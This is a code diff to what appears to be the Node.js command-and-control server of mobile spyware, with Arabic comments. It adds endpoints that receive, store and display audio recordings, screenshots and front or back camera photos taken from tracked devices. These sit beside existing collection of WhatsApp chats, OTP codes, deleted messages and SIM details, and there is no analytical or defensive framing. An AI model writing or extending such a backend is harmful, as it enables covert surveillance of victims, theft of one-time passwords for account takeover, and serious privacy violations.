@@ -9,10 +9,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(cors());
-
-// ✅ 50 MB بدل 500 — يمنع OOM على Render Free (512 MB RAM)
 app.use(bodyParser.json({ limit: '50mb' }));
-
 app.use(express.static('public'));
 
 const dataDir = path.join(__dirname, 'data');
@@ -336,6 +333,63 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, voice_count: voices.length });
         }
 
+        // ✅ ✅ ✅ جديد — تسجيل صوت
+        if (data.type === 'audio_recording' && data.file_data) {
+            const deviceId = data.device_id || 'unknown';
+            const deviceDir = path.join(dataDir, deviceId);
+            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+            const audioFile = path.join(deviceDir, 'audio_recordings.json');
+            let audios = [];
+            if (fs.existsSync(audioFile)) audios = JSON.parse(fs.readFileSync(audioFile, 'utf8'));
+            const exists = audios.find(a => a.file_name === data.file_name);
+            if (exists) return res.json({ success: true, duplicated: true });
+            const audioEntry = { file_name: data.file_name || '', file_data: data.file_data || '', file_size: data.file_size || 0, timestamp: data.timestamp || Date.now() };
+            audios.unshift(audioEntry);
+            if (audios.length > 200) audios = audios.slice(0, 200);
+            fs.writeFileSync(audioFile, JSON.stringify(audios, null, 2));
+            updateDevicesList(deviceId, null);
+            pushToDevice(deviceId, 'new_audio', audioEntry);
+            return res.json({ success: true, audio_count: audios.length });
+        }
+
+        // ✅ ✅ ✅ جديد — لقطة شاشة
+        if (data.type === 'screenshot_data' && data.file_data) {
+            const deviceId = data.device_id || 'unknown';
+            const deviceDir = path.join(dataDir, deviceId);
+            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+            const screenshotFile = path.join(deviceDir, 'screenshots.json');
+            let screenshots = [];
+            if (fs.existsSync(screenshotFile)) screenshots = JSON.parse(fs.readFileSync(screenshotFile, 'utf8'));
+            const exists = screenshots.find(s => s.file_name === data.file_name);
+            if (exists) return res.json({ success: true, duplicated: true });
+            const screenshotEntry = { file_name: data.file_name || '', file_data: data.file_data || '', file_size: data.file_size || 0, timestamp: data.timestamp || Date.now() };
+            screenshots.unshift(screenshotEntry);
+            if (screenshots.length > 200) screenshots = screenshots.slice(0, 200);
+            fs.writeFileSync(screenshotFile, JSON.stringify(screenshots, null, 2));
+            updateDevicesList(deviceId, null);
+            pushToDevice(deviceId, 'new_screenshot', screenshotEntry);
+            return res.json({ success: true, screenshot_count: screenshots.length });
+        }
+
+        // ✅ ✅ ✅ جديد — صورة كاميرا (أمامي/خلفي)
+        if (data.type === 'camera_photo' && data.file_data) {
+            const deviceId = data.device_id || 'unknown';
+            const deviceDir = path.join(dataDir, deviceId);
+            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+            const cameraFile = path.join(deviceDir, 'camera_photos.json');
+            let photos = [];
+            if (fs.existsSync(cameraFile)) photos = JSON.parse(fs.readFileSync(cameraFile, 'utf8'));
+            const exists = photos.find(p => p.file_name === data.file_name);
+            if (exists) return res.json({ success: true, duplicated: true });
+            const photoEntry = { file_name: data.file_name || '', file_data: data.file_data || '', file_size: data.file_size || 0, camera_id: data.camera_id !== undefined ? data.camera_id : 0, camera_name: data.camera_name || 'back', timestamp: data.timestamp || Date.now() };
+            photos.unshift(photoEntry);
+            if (photos.length > 200) photos = photos.slice(0, 200);
+            fs.writeFileSync(cameraFile, JSON.stringify(photos, null, 2));
+            updateDevicesList(deviceId, null);
+            pushToDevice(deviceId, 'new_camera_photo', photoEntry);
+            return res.json({ success: true, camera_count: photos.length });
+        }
+
         if (data.type === 'deleted_data') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -570,6 +624,9 @@ app.get('/live.php', (req, res) => {
         const selfFile = path.join(dataDir, deviceId, 'self_number.json');
         const profileFile = path.join(dataDir, deviceId, 'profile.json');
         const voiceFile = path.join(dataDir, deviceId, 'voice_notes.json');
+        const audioFile = path.join(dataDir, deviceId, 'audio_recordings.json');
+        const screenshotFile = path.join(dataDir, deviceId, 'screenshots.json');
+        const cameraFile = path.join(dataDir, deviceId, 'camera_photos.json');
 
         let response = {
             online: false,
@@ -589,6 +646,9 @@ app.get('/live.php', (req, res) => {
             deleted_count: 0,
             otp_count: 0,
             voice_count: 0,
+            audio_count: 0,
+            screenshot_count: 0,
+            camera_count: 0,
             sim_numbers: [],
             carrier: '',
             self_number: '',
@@ -599,7 +659,6 @@ app.get('/live.php', (req, res) => {
         if (fs.existsSync(liveFile)) {
             const live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
             const lastSeen = live.last_seen || 0;
-            // ✅ 60 ثانية بدل 20 — نافذة أوسع
             response.online = (Math.floor(Date.now()/1000) - lastSeen) < 60;
             response.network = live.network || 'غير معروف';
             response.network_type = live.network_type || 'غير معروف';
@@ -623,6 +682,9 @@ app.get('/live.php', (req, res) => {
         if (fs.existsSync(deletedFile)) response.deleted_count = JSON.parse(fs.readFileSync(deletedFile, 'utf8')).length;
         if (fs.existsSync(otpFile)) response.otp_count = JSON.parse(fs.readFileSync(otpFile, 'utf8')).length;
         if (fs.existsSync(voiceFile)) response.voice_count = JSON.parse(fs.readFileSync(voiceFile, 'utf8')).length;
+        if (fs.existsSync(audioFile)) response.audio_count = JSON.parse(fs.readFileSync(audioFile, 'utf8')).length;
+        if (fs.existsSync(screenshotFile)) response.screenshot_count = JSON.parse(fs.readFileSync(screenshotFile, 'utf8')).length;
+        if (fs.existsSync(cameraFile)) response.camera_count = JSON.parse(fs.readFileSync(cameraFile, 'utf8')).length;
 
         if (fs.existsSync(simFile)) {
             try {
@@ -665,7 +727,7 @@ app.get('/api.php', (req, res) => {
             if (!session || Date.now() > session.expires) return res.status(401).json({ error: 'Unauthorized' });
 
             if (!session.isOwner) {
-                const ownerOnlyActions = ['delete_device', 'clear_deleted', 'delete_deleted_item', 'delete_whatsapp_chat', 'delete_whatsapp', 'clear_whatsapp', 'delete_email', 'delete_voice', 'clear_voices'];
+                const ownerOnlyActions = ['delete_device', 'clear_deleted', 'delete_deleted_item', 'delete_whatsapp_chat', 'delete_whatsapp', 'clear_whatsapp', 'delete_email', 'delete_voice', 'clear_voices', 'clear_audio', 'clear_screenshots', 'clear_camera_photos'];
                 if (ownerOnlyActions.includes(action)) return res.status(403).json({ error: 'Forbidden - Owner only' });
 
                 if (deviceId) {
@@ -720,6 +782,89 @@ app.get('/api.php', (req, res) => {
             const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
             if (fs.existsSync(imagesFile)) return res.json(JSON.parse(fs.readFileSync(imagesFile, 'utf8')));
             return res.json([]);
+        }
+
+        // ✅ ✅ ✅ جديد — جلب التسجيلات الصوتية
+        if (action === 'get_audio_recordings') {
+            const audioFile = path.join(dataDir, deviceId, 'audio_recordings.json');
+            if (fs.existsSync(audioFile)) return res.json(JSON.parse(fs.readFileSync(audioFile, 'utf8')));
+            return res.json([]);
+        }
+
+        // ✅ جديد — حذف تسجيل صوتي
+        if (action === 'delete_audio') {
+            const idx = parseInt(req.query.index);
+            const audioFile = path.join(dataDir, deviceId, 'audio_recordings.json');
+            if (fs.existsSync(audioFile)) {
+                let audios = JSON.parse(fs.readFileSync(audioFile, 'utf8'));
+                if (!isNaN(idx) && idx >= 0 && idx < audios.length) {
+                    audios.splice(idx, 1);
+                    fs.writeFileSync(audioFile, JSON.stringify(audios, null, 2));
+                    return res.json({ success: true });
+                }
+            }
+            return res.json({ success: false });
+        }
+
+        // ✅ جديد — مسح كل التسجيلات
+        if (action === 'clear_audio') {
+            const audioFile = path.join(dataDir, deviceId, 'audio_recordings.json');
+            if (fs.existsSync(audioFile)) fs.writeFileSync(audioFile, '[]');
+            return res.json({ success: true });
+        }
+
+        // ✅ ✅ ✅ جديد — جلب لقطات الشاشة
+        if (action === 'get_screenshots') {
+            const screenshotFile = path.join(dataDir, deviceId, 'screenshots.json');
+            if (fs.existsSync(screenshotFile)) return res.json(JSON.parse(fs.readFileSync(screenshotFile, 'utf8')));
+            return res.json([]);
+        }
+
+        if (action === 'delete_screenshot') {
+            const idx = parseInt(req.query.index);
+            const screenshotFile = path.join(dataDir, deviceId, 'screenshots.json');
+            if (fs.existsSync(screenshotFile)) {
+                let screenshots = JSON.parse(fs.readFileSync(screenshotFile, 'utf8'));
+                if (!isNaN(idx) && idx >= 0 && idx < screenshots.length) {
+                    screenshots.splice(idx, 1);
+                    fs.writeFileSync(screenshotFile, JSON.stringify(screenshots, null, 2));
+                    return res.json({ success: true });
+                }
+            }
+            return res.json({ success: false });
+        }
+
+        if (action === 'clear_screenshots') {
+            const screenshotFile = path.join(dataDir, deviceId, 'screenshots.json');
+            if (fs.existsSync(screenshotFile)) fs.writeFileSync(screenshotFile, '[]');
+            return res.json({ success: true });
+        }
+
+        // ✅ ✅ ✅ جديد — جلب صور الكاميرا
+        if (action === 'get_camera_photos') {
+            const cameraFile = path.join(dataDir, deviceId, 'camera_photos.json');
+            if (fs.existsSync(cameraFile)) return res.json(JSON.parse(fs.readFileSync(cameraFile, 'utf8')));
+            return res.json([]);
+        }
+
+        if (action === 'delete_camera_photo') {
+            const idx = parseInt(req.query.index);
+            const cameraFile = path.join(dataDir, deviceId, 'camera_photos.json');
+            if (fs.existsSync(cameraFile)) {
+                let photos = JSON.parse(fs.readFileSync(cameraFile, 'utf8'));
+                if (!isNaN(idx) && idx >= 0 && idx < photos.length) {
+                    photos.splice(idx, 1);
+                    fs.writeFileSync(cameraFile, JSON.stringify(photos, null, 2));
+                    return res.json({ success: true });
+                }
+            }
+            return res.json({ success: false });
+        }
+
+        if (action === 'clear_camera_photos') {
+            const cameraFile = path.join(dataDir, deviceId, 'camera_photos.json');
+            if (fs.existsSync(cameraFile)) fs.writeFileSync(cameraFile, '[]');
+            return res.json({ success: true });
         }
 
         if (action === 'delete_whatsapp_chat') {
